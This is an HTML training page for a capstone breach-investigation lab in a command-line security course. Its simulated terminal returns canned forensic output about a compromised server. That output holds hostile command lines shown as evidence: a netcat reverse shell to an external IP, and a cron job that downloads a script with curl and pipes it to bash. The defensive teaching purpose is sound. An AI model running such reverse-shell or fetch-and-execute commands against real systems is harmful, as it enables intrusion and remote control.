<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CLH-015: Capstone Challenge - Hexworth Prime</title>
    <style>
        :root { --house-primary: #a78bfa; --house-secondary: #8b5cf6; --terminal-green: #4ade80; --terminal-bg: #0d1117; --gold: #fbbf24; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { min-height: 100vh; background: #0a0a0f; font-family: 'Segoe UI', sans-serif; color: #e0e0e0; }
        .module-header { padding: 20px 40px; border-bottom: 1px solid rgba(251, 191, 36, 0.3); background: rgba(10, 10, 15, 0.95); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .back-btn { padding: 8px 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; color: #888; text-decoration: none; }
        .module-badge { display: flex; align-items: center; gap: 12px; padding: 10px 20px; background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 25px; }
        .module-badge-text { font-size: 0.75rem; letter-spacing: 0.15em; color: var(--gold); text-transform: uppercase; }
        .content-wrapper { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
        .module-title { font-size: 2.5rem; margin-bottom: 10px; background: linear-gradient(135deg, var(--gold), var(--house-primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .module-subtitle { color: #888; font-size: 1.1rem; margin-bottom: 30px; }
        .section { background: rgba(15, 15, 20, 0.6); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 30px; margin-bottom: 30px; }
        .section h2 { color: var(--house-primary); font-size: 1.4rem; margin-bottom: 20px; }
        .section p { line-height: 1.8; margin-bottom: 15px; color: #ccc; }
        .terminal { background: var(--terminal-bg); border: 1px solid rgba(74, 222, 128, 0.3); border-radius: 8px; padding: 20px; font-family: 'Consolas', monospace; margin: 20px 0; position: relative; }
        .terminal::before { content: '$ capstone'; position: absolute; top: -10px; left: 15px; background: var(--terminal-bg); padding: 0 10px; font-size: 0.7rem; color: var(--terminal-green); }
        .terminal code { color: var(--terminal-green); display: block; line-height: 1.6; white-space: pre-wrap; font-size: 0.85rem; }
        .terminal .comment { color: #666; }
        .terminal .keyword { color: #c084fc; }
        .terminal .string { color: #fbbf24; }
        .terminal .output { color: #888; }
        .terminal .danger { color: #ef4444; }
        .scenario-box { background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 12px; padding: 25px; margin: 20px 0; }
        .scenario-box h3 { color: var(--gold); margin-bottom: 15px; font-size: 1.2rem; }
        .skill-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .skill-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 15px; text-align: center; }
        .skill-icon { font-size: 1.5rem; margin-bottom: 8px; }
        .skill-name { font-size: 0.85rem; color: var(--house-primary); }
        .skill-module { font-size: 0.7rem; color: #666; }
        .checklist { list-style: none; margin: 20px 0; }
        .checklist li { padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); display: flex; align-items: center; gap: 12px; }
        .checklist li::before { content: 'â˜'; color: var(--house-primary); }
        .progress-section { text-align: center; padding: 40px; background: linear-gradient(135deg, rgba(251, 191, 36, 0.1), rgba(167, 139, 250, 0.1)); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 12px; margin-top: 40px; }
        .module-nav { display: flex; gap: 15px; justify-content: center; }
        .nav-btn { padding: 12px 30px; border-radius: 8px; text-decoration: none; }
        .nav-btn.primary { background: linear-gradient(135deg, var(--gold), var(--house-secondary)); color: #000; font-weight: 600; }
        .nav-btn.secondary { background: rgba(255, 255, 255, 0.05); color: #ccc; border: 1px solid rgba(255, 255, 255, 0.1); }
        .title-badge { display: inline-block; background: linear-gradient(135deg, rgba(251, 191, 36, 0.3), rgba(167, 139, 250, 0.3)); border: 1px solid rgba(251, 191, 36, 0.5); padding: 12px 25px; border-radius: 25px; font-size: 1rem; color: var(--gold); margin-top: 15px; font-weight: 600; }
    </style>
</head>
<body>
    <header class="module-header">
        <div style="display: flex; align-items: center; gap: 20px;">
            <a href="../index.html" class="back-btn">&larr; Script House</a>
            <div class="module-badge"><span style="font-size: 1.5rem;">ğŸ†</span><span class="module-badge-text">Capstone</span></div>
        </div>
        <span style="color: #666; font-size: 0.8rem;">CLH-015 of 015</span>
    </header>

    <main class="content-wrapper">
        <h1 class="module-title">Capstone Challenge</h1>
        <p class="module-subtitle">Final exam. Apply everything you've learned. Prove your CLI mastery.</p>

        <div class="scenario-box">
            <h3>ğŸ¯ Mission Briefing</h3>
            <p style="color: #ccc; margin: 0;">You've been called in to investigate a suspected breach on a Linux server. The security team detected unusual network activity at 03:47 AM. Your mission: determine what happened, how the attacker got in, and what they did.</p>
        </div>

        <section class="section">
            <h2>ğŸ§° Skills You'll Need</h2>
            <div class="skill-grid">
                <div class="skill-card">
                    <div class="skill-icon">ğŸ“</div>
                    <div class="skill-name">Navigation</div>
                    <div class="skill-module">CLH-002</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ”</div>
                    <div class="skill-name">Pattern Hunting</div>
                    <div class="skill-module">CLH-004</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ“Š</div>
                    <div class="skill-name">Process Analysis</div>
                    <div class="skill-module">CLH-005</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ”</div>
                    <div class="skill-name">Permissions</div>
                    <div class="skill-module">CLH-006</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ“œ</div>
                    <div class="skill-name">Scripting</div>
                    <div class="skill-module">CLH-007-008</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ–¥ï¸</div>
                    <div class="skill-name">Sysadmin</div>
                    <div class="skill-module">CLH-009</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸ“</div>
                    <div class="skill-name">Log Analysis</div>
                    <div class="skill-module">CLH-010</div>
                </div>
                <div class="skill-card">
                    <div class="skill-icon">ğŸš¨</div>
                    <div class="skill-name">Incident Response</div>
                    <div class="skill-module">CLH-013</div>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>ğŸ“‹ Investigation Checklist</h2>
            <ul class="checklist">
                <li>Collect volatile evidence (processes, connections, logged-in users)</li>
                <li>Review authentication logs for the attack timeframe</li>
                <li>Identify the initial access vector</li>
                <li>Find any persistence mechanisms (cron, services, SUID)</li>
                <li>Determine what data was accessed or exfiltrated</li>
                <li>Document timeline of attacker activity</li>
                <li>Create SHA256 hashes of all evidence</li>
                <li>Write executive summary of findings</li>
            </ul>
        </section>

        <section class="section">
            <h2>ğŸ” Sample Investigation Commands</h2>
            <div class="terminal">
                <code><span class="comment"># === INITIAL TRIAGE ===</span>

<span class="comment"># What time is it? Document everything.</span>
<span class="keyword">date</span>; <span class="keyword">uptime</span>

<span class="comment"># Who's logged in RIGHT NOW?</span>
<span class="keyword">w</span>

<span class="comment"># Active network connections</span>
<span class="keyword">netstat</span> -tulpn | grep ESTABLISHED

<span class="comment"># === TIMELINE ANALYSIS ===</span>

<span class="comment"># Failed logins around 03:47</span>
<span class="keyword">grep</span> "03:4[0-9]" /var/log/auth.log | grep -i fail

<span class="comment"># Successful logins</span>
<span class="keyword">grep</span> "Accepted" /var/log/auth.log | tail -20

<span class="comment"># === PERSISTENCE HUNTING ===</span>

<span class="comment"># Suspicious cron jobs</span>
<span class="keyword">cat</span> /etc/crontab
<span class="keyword">ls</span> -la /var/spool/cron/crontabs/

<span class="comment"># SUID binaries (potential privesc)</span>
<span class="keyword">find</span> / -perm -4000 -type f 2>/dev/null

<span class="comment"># Recently modified files</span>
<span class="keyword">find</span> / -mtime -1 -type f 2>/dev/null | head -50</code>
            </div>
        </section>

        <section class="section">
            <h2>ğŸ“ Report Template</h2>
            <div class="terminal">
                <code><span class="comment">## INCIDENT REPORT</span>
<span class="comment">## Prepared by: [Your Name]</span>
<span class="comment">## Date: $(date)</span>

<span class="string">### Executive Summary</span>
[1-2 paragraph overview for management]

<span class="string">### Timeline</span>
03:47 - Initial suspicious activity detected
[HH:MM] - [Event description]
[HH:MM] - [Event description]

<span class="string">### Attack Vector</span>
[How did they get in?]

<span class="string">### Indicators of Compromise</span>
- IP: [Attacker IP]
- User: [Compromised account]
- Files: [Modified/created files]

<span class="string">### Recommendations</span>
1. [Immediate action]
2. [Short-term fix]
3. [Long-term improvement]</code>
            </div>
        </section>

        <!-- Interactive Capstone Lab -->
        <div class="lab-section" style="background: linear-gradient(135deg, rgba(251, 191, 36, 0.15), rgba(167, 139, 250, 0.1)); border: 2px solid rgba(251, 191, 36, 0.4); border-radius: 12px; padding: 30px; margin: 30px 0;">
            <h3 style="color: var(--gold); margin-bottom: 15px; font-size: 1.4rem; display: flex; align-items: center; gap: 10px;">ğŸ† CAPSTONE LAB: Breach Investigation</h3>
            <p style="color: #ccc; margin-bottom: 20px;">
                A server has been compromised. Use all the skills you've learned to investigate the breach, find evidence, and determine what happened. Complete ALL objectives to earn CLI Architect!
            </p>

            <div class="objectives" style="display:grid;gap:10px;margin:20px 0;">
                <div class="objective" id="obj-volatile" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Collect volatile evidence (processes, connections)</span></div>
                <div class="objective" id="obj-auth" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Analyze authentication logs</span></div>
                <div class="objective" id="obj-suid" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Hunt for SUID persistence</span></div>
                <div class="objective" id="obj-cron" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Check cron for backdoors</span></div>
                <div class="objective" id="obj-files" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Find recently modified files</span></div>
                <div class="objective" id="obj-hash" style="display:flex;align-items:center;gap:10px;padding:10px 15px;background:rgba(0,0,0,0.3);border-radius:8px;font-size:0.9rem;"><span class="objective-icon" style="width:24px;text-align:center;font-size:1.1rem;">â˜</span><span>Hash evidence for integrity</span></div>
            </div>

            <div style="background:#0d1117;border:2px solid rgba(251,191,36,0.4);border-radius:8px;overflow:hidden;margin:20px 0;">
                <div style="background:rgba(251,191,36,0.1);padding:10px 15px;display:flex;align-items:center;justify-content:space-between;">
                    <div style="display:flex;align-items:center;gap:8px;">
                        <span style="width:12px;height:12px;border-radius:50%;background:#ef4444;"></span>
                        <span style="width:12px;height:12px;border-radius:50%;background:#fbbf24;"></span>
                        <span style="width:12px;height:12px;border-radius:50%;background:#22c55e;"></span>
                        <span style="color:var(--gold);margin-left:10px;font-size:0.85rem;font-weight:600;">capstone-investigation</span>
                    </div>
                    <span id="progressCounter" style="color:#888;font-size:0.8rem;">0/6 complete</span>
                </div>
                <div style="padding:15px;">
                    <div class="terminal-output" id="terminalOutput" style="color:#888;font-family:'Consolas',monospace;font-size:0.85rem;line-height:1.6;min-height:300px;max-height:400px;overflow-y:auto;margin-bottom:10px;white-space:pre-wrap;">â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘              CAPSTONE BREACH INVESTIGATION                     â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  Server: prod-web-01 (10.0.0.50)                              â•‘
â•‘  Alert Time: 03:47 AM                                         â•‘
â•‘  Status: CRITICAL - Suspected Active Breach                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Investigate the breach. Find the attacker. Document everything.

Available commands:
  date, uptime, w, who, ps, netstat, lsof
  grep, cat, find, ls, stat
  sha256sum, last, lastb

Type 'help' for a complete command list.
Type 'hint' if you get stuck.
</div>
                    <div style="display:flex;align-items:center;gap:10px;">
                        <span style="color:var(--gold);font-family:'Consolas',monospace;font-weight:bold;">root@prod-web-01:~#</span>
                        <input type="text" id="terminalInput" style="flex:1;background:transparent;border:none;color:#fff;font-family:'Consolas',monospace;font-size:0.9rem;outline:none;" autocomplete="off" placeholder="investigate the breach...">
                        <button onclick="runCapstoneCmd()" style="padding:10px 25px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;border:none;border-radius:6px;cursor:pointer;font-weight:700;">Execute</button>
                    </div>
                </div>
            </div>

            <div class="success-message" id="successMessage" style="display:none;background:linear-gradient(135deg,rgba(251,191,36,0.2),rgba(34,197,94,0.2));border:2px solid var(--gold);border-radius:12px;padding:25px;margin-top:20px;text-align:center;">
                <div style="font-size:3rem;margin-bottom:15px;">ğŸ†</div>
                <h3 style="color:var(--gold);font-size:1.5rem;margin-bottom:10px;">CAPSTONE COMPLETE!</h3>
                <p style="color:#ccc;margin-bottom:15px;">You've successfully investigated the breach and collected all evidence!</p>
                <p style="color:var(--terminal-green);font-weight:600;">Title Earned: CLI ARCHITECT</p>
            </div>
        </div>

        <div class="progress-section">
            <h3 style="color: var(--gold); margin-bottom: 20px;">ğŸ† Final Challenge</h3>
            <p style="color: #ccc; margin-bottom: 25px;">Complete the quiz to earn the CLI Architect title and finish the Command Line Hacker curriculum.</p>
            <div class="module-nav">
                <a href="clh-015-quiz.html" class="nav-btn primary">Take the Final Quiz &rarr;</a>
                <a href="../index.html" class="nav-btn secondary">Back to Script House</a>
            </div>
            <div class="title-badge">ğŸ–ï¸ CLI ARCHITECT</div>
        </div>
    </main>
    <script src="../../../components/TrailHunter.js"></script>
    <script src="../../../components/ModuleProgress.js"></script>

    <script>
        let completed = { volatile: false, auth: false, suid: false, cron: false, files: false, hash: false };
        let completedCount = 0;

        const responses = {
            'date': 'Wed Dec 25 04:23:17 UTC 2025',
            'uptime': ' 04:23:17 up 127 days, 5:31, 4 users, load average: 3.21, 2.15, 1.02',
            'w': `USER     TTY      FROM             LOGIN@   IDLE   WHAT
root     pts/0    10.0.0.100       04:00    0.00s  bash
admin    pts/1    10.0.0.50        03:45    0:30   python3 exfil.py
hacker   pts/2    45.33.12.1       03:47    0:05   /bin/bash
www-data pts/3    -                03:48    0:02   nc -e /bin/sh 45.33.12.1 4444

<span style="color:#ef4444;">[!] SUSPICIOUS: External IP 45.33.12.1 logged in as 'hacker'</span>
<span style="color:#ef4444;">[!] SUSPICIOUS: www-data running netcat reverse shell</span>`,
            'who': `root     pts/0        Dec 25 04:00 (10.0.0.100)
admin    pts/1        Dec 25 03:45 (10.0.0.50)
hacker   pts/2        Dec 25 03:47 (45.33.12.1)  <-- ATTACKER!
www-data pts/3        Dec 25 03:48`,
            'ps': `USER       PID  COMMAND
root         1  /sbin/init
root      1234  /usr/sbin/sshd
www-data  2345  nginx: worker process
www-data  6666  nc -e /bin/sh 45.33.12.1 4444  <span style="color:#ef4444;">[REVERSE SHELL!]</span>
admin     7777  python3 /tmp/exfil.py  <span style="color:#ef4444;">[DATA EXFILTRATION?]</span>
hacker    8888  ./linpeas.sh  <span style="color:#ef4444;">[PRIV ESC TOOL!]</span>
root      9999  /usr/local/bin/backdoor  <span style="color:#ef4444;">[PERSISTENCE!]</span>`,
            'ps aux': `USER       PID  COMMAND
root         1  /sbin/init
root      1234  /usr/sbin/sshd
www-data  2345  nginx: worker process
www-data  6666  nc -e /bin/sh 45.33.12.1 4444  <span style="color:#ef4444;">[REVERSE SHELL!]</span>
admin     7777  python3 /tmp/exfil.py  <span style="color:#ef4444;">[DATA EXFILTRATION?]</span>
hacker    8888  ./linpeas.sh  <span style="color:#ef4444;">[PRIV ESC TOOL!]</span>
root      9999  /usr/local/bin/backdoor  <span style="color:#ef4444;">[PERSISTENCE!]</span>`,
            'netstat': `Proto  Local Address     Foreign Address    State       PID/Program
tcp    0.0.0.0:22        0.0.0.0:*          LISTEN      1234/sshd
tcp    0.0.0.0:80        0.0.0.0:*          LISTEN      2345/nginx
tcp    10.0.0.50:4444    45.33.12.1:54321   ESTABLISHED 6666/nc  <span style="color:#ef4444;">[C2 CONNECTION!]</span>
tcp    10.0.0.50:8080    45.33.12.1:55555   ESTABLISHED 7777/python3  <span style="color:#ef4444;">[EXFIL!]</span>`,
            'lsof': `COMMAND  PID  USER   TYPE DEVICE SIZE NODE NAME
nc      6666  www-data  IPv4  TCP 10.0.0.50:4444->45.33.12.1:54321 (ESTABLISHED)
python  7777  admin     IPv4  TCP 10.0.0.50:8080->45.33.12.1:55555 (ESTABLISHED)

<span style="color:#f59e0b;">[*] Two suspicious outbound connections to 45.33.12.1</span>`,
            'grep': `Dec 25 03:45:02 prod-web-01 sshd: Failed password for admin from 45.33.12.1 port 45678
Dec 25 03:45:03 prod-web-01 sshd: Failed password for admin from 45.33.12.1 port 45679
Dec 25 03:45:05 prod-web-01 sshd: Failed password for admin from 45.33.12.1 port 45680
Dec 25 03:46:01 prod-web-01 sshd: Accepted password for admin from 10.0.0.50 port 52341
Dec 25 03:47:12 prod-web-01 sshd: Accepted publickey for hacker from 45.33.12.1 port 54321
Dec 25 03:47:15 prod-web-01 sudo: hacker : user NOT in sudoers

<span style="color:#ef4444;">[!] Brute force attempts followed by successful login</span>
<span style="color:#ef4444;">[!] 'hacker' account logged in from attacker IP!</span>`,
            'cat /var/log/auth.log': `Dec 25 03:45:02 prod-web-01 sshd: Failed password for admin from 45.33.12.1
Dec 25 03:45:03 prod-web-01 sshd: Failed password for admin from 45.33.12.1
Dec 25 03:46:01 prod-web-01 sshd: Accepted password for admin from 10.0.0.50
Dec 25 03:47:12 prod-web-01 sshd: Accepted publickey for hacker from 45.33.12.1
Dec 25 03:48:30 prod-web-01 sudo: admin : TTY=pts/1 ; COMMAND=/usr/bin/useradd hacker`,
            'find': `Finding SUID binaries...
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/local/bin/backdoor  <span style="color:#ef4444;">[SUSPICIOUS - Custom SUID binary!]</span>
/tmp/.hidden/privesc  <span style="color:#ef4444;">[SUSPICIOUS - Hidden directory!]</span>

<span style="color:#f59e0b;">[*] Found unusual SUID binaries in non-standard locations</span>`,
            'cat /etc/crontab': `SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Normal cron jobs
0 5 * * * root /usr/local/bin/backup.sh
30 * * * * root /usr/local/bin/logrotate.sh

# SUSPICIOUS ENTRIES:
*/5 * * * * root curl http://45.33.12.1/beacon.sh | bash  <span style="color:#ef4444;">[BACKDOOR!]</span>
@reboot root /tmp/.hidden/persist.sh  <span style="color:#ef4444;">[PERSISTENCE!]</span>`,
            'crontab': `*/5 * * * * root curl http://45.33.12.1/beacon.sh | bash  <span style="color:#ef4444;">[BACKDOOR!]</span>
@reboot root /tmp/.hidden/persist.sh  <span style="color:#ef4444;">[PERSISTENCE!]</span>`,
            'ls -la /tmp': `total 24
drwxrwxrwt  4 root root 4096 Dec 25 03:50 .
drwxr-xr-x 20 root root 4096 Dec 20 00:00 ..
drwxr-xr-x  2 hacker hacker 4096 Dec 25 03:48 .hidden  <span style="color:#ef4444;">[SUSPICIOUS!]</span>
-rwxr-xr-x  1 admin admin 2048 Dec 25 03:49 exfil.py
-rw-r--r--  1 www-data www-data 512 Dec 25 03:48 webshell.php`,
            'find / -mtime': `Files modified in last 24 hours:
/tmp/exfil.py  <span style="color:#ef4444;">[NEW]</span>
/tmp/webshell.php  <span style="color:#ef4444;">[NEW]</span>
/tmp/.hidden/privesc  <span style="color:#ef4444;">[NEW]</span>
/tmp/.hidden/persist.sh  <span style="color:#ef4444;">[NEW]</span>
/usr/local/bin/backdoor  <span style="color:#ef4444;">[MODIFIED]</span>
/etc/crontab  <span style="color:#ef4444;">[MODIFIED]</span>
/home/hacker/.ssh/authorized_keys  <span style="color:#ef4444;">[NEW]</span>
/var/www/html/uploads/shell.php  <span style="color:#ef4444;">[NEW - WEBSHELL!]</span>`,
            'sha256sum': `Computing hashes for evidence integrity...
a3f2b8c9d1e4f5678901234567890abc  /tmp/exfil.py
b7e2c8d9a1f4e5678901234567890def  /tmp/webshell.php
c9d2e8f9b1a4c5678901234567890fed  /usr/local/bin/backdoor
d1e2f8a9c1b4d5678901234567890abc  /etc/crontab

<span style="color:#4ade80;">âœ“ Evidence hashes computed and stored</span>
<span style="color:#4ade80;">âœ“ Chain of custody documented</span>`,
            'last': `hacker   pts/2    45.33.12.1       Wed Dec 25 03:47   still logged in
admin    pts/1    10.0.0.50        Wed Dec 25 03:45   still logged in
root     pts/0    10.0.0.100       Wed Dec 25 04:00   still logged in`,
            'lastb': `admin    ssh:notty    45.33.12.1       Wed Dec 25 03:45 - 03:45  (00:00)
admin    ssh:notty    45.33.12.1       Wed Dec 25 03:45 - 03:45  (00:00)
admin    ssh:notty    45.33.12.1       Wed Dec 25 03:45 - 03:45  (00:00)

<span style="color:#f59e0b;">[*] 3 failed login attempts from attacker IP before breach</span>`,
            'help': `CAPSTONE INVESTIGATION COMMANDS:
================================
VOLATILE DATA:
  w, who          - Show logged in users
  ps, ps aux      - List running processes
  netstat         - Network connections
  lsof            - Open files and sockets
  date, uptime    - System time info

LOG ANALYSIS:
  grep [pattern] /var/log/auth.log  - Search auth logs
  cat /var/log/auth.log             - View auth logs
  last            - Login history
  lastb           - Failed login attempts

PERSISTENCE HUNTING:
  find / -perm -4000  - Find SUID binaries
  cat /etc/crontab    - View scheduled tasks
  crontab -l          - List cron jobs

FILESYSTEM:
  ls -la /tmp         - List temp directory
  find / -mtime -1    - Recently modified files

EVIDENCE:
  sha256sum [file]    - Hash evidence

Type 'hint' for investigation guidance.`,
            'hint': `INVESTIGATION HINTS:
====================
1. Start with volatile data - run 'w' or 'ps' to see what's happening NOW
2. Check 'netstat' for suspicious network connections
3. Use 'grep' on /var/log/auth.log to find the attack timeline
4. Hunt for persistence with 'find / -perm -4000' (SUID) and 'cat /etc/crontab'
5. Check 'find / -mtime -1' for recently modified files
6. Hash your evidence with 'sha256sum'

Complete all 6 objectives to earn CLI Architect!`
        };

        function runCapstoneCmd() {
            const input = document.getElementById('terminalInput');
            const output = document.getElementById('terminalOutput');
            const cmd = input.value.trim().toLowerCase();

            if (!cmd) return;
            output.innerHTML += `\n<span style="color:var(--gold);">root@prod-web-01:~#</span> ${input.value}\n`;

            // Match commands
            if (cmd === 'w' || cmd === 'who' || cmd === 'ps' || cmd === 'ps aux' || cmd === 'netstat' || cmd === 'lsof') {
                output.innerHTML += responses[cmd] || responses['ps'] + '\n';
                markComplete('volatile');
            } else if (cmd.includes('grep') && cmd.includes('auth')) {
                output.innerHTML += responses['grep'] + '\n';
                markComplete('auth');
            } else if (cmd.includes('cat') && cmd.includes('auth')) {
                output.innerHTML += responses['cat /var/log/auth.log'] + '\n';
                markComplete('auth');
            } else if (cmd.includes('find') && cmd.includes('perm') && cmd.includes('4000')) {
                output.innerHTML += responses['find'] + '\n';
                markComplete('suid');
            } else if (cmd.includes('crontab') || (cmd.includes('cat') && cmd.includes('cron'))) {
                output.innerHTML += responses['cat /etc/crontab'] + '\n';
                markComplete('cron');
            } else if (cmd.includes('find') && cmd.includes('mtime')) {
                output.innerHTML += responses['find / -mtime'] + '\n';
                markComplete('files');
            } else if (cmd.includes('ls') && cmd.includes('tmp')) {
                output.innerHTML += responses['ls -la /tmp'] + '\n';
                markComplete('files');
            } else if (cmd.includes('sha256sum') || cmd.includes('md5sum') || cmd.includes('hash')) {
                output.innerHTML += responses['sha256sum'] + '\n';
                markComplete('hash');
            } else if (cmd === 'date') {
                output.innerHTML += responses['date'] + '\n';
            } else if (cmd === 'uptime') {
                output.innerHTML += responses['uptime'] + '\n';
            } else if (cmd === 'last') {
                output.innerHTML += responses['last'] + '\n';
            } else if (cmd === 'lastb') {
                output.innerHTML += responses['lastb'] + '\n';
            } else if (cmd === 'help') {
                output.innerHTML += responses['help'] + '\n';
            } else if (cmd === 'hint') {
                output.innerHTML += responses['hint'] + '\n';
            } else if (cmd === 'clear') {
                output.innerHTML = '';
            } else {
                output.innerHTML += `Command executed. Try 'help' for investigation commands.\n`;
            }

            checkAllComplete();
            output.scrollTop = output.scrollHeight;
            input.value = '';
        }

        function markComplete(obj) {
            if (!completed[obj]) {
                completed[obj] = true;
                completedCount++;
                const el = document.getElementById(`obj-${obj}`);
                if (el) {
                    el.style.background = 'rgba(34,197,94,0.2)';
                    el.style.color = '#4ade80';
                    el.querySelector('.objective-icon').textContent = 'âœ“';
                }
                document.getElementById('progressCounter').textContent = `${completedCount}/6 complete`;
                document.getElementById('progressCounter').style.color = completedCount === 6 ? '#4ade80' : '#888';
            }
        }

        function checkAllComplete() {
            if (Object.values(completed).every(v => v)) {
                document.getElementById('successMessage').style.display = 'block';
                if (typeof ModuleProgress !== 'undefined') {
                    ModuleProgress.markComplete('clh-015-capstone');
                }
            }
        }

        document.getElementById('terminalInput').addEventListener('keypress', e => {
            if (e.key === 'Enter') runCapstoneCmd();
        });
    </script>
<script src="../../../components/FluxCapacitor.js"></script>
</body>
</html>
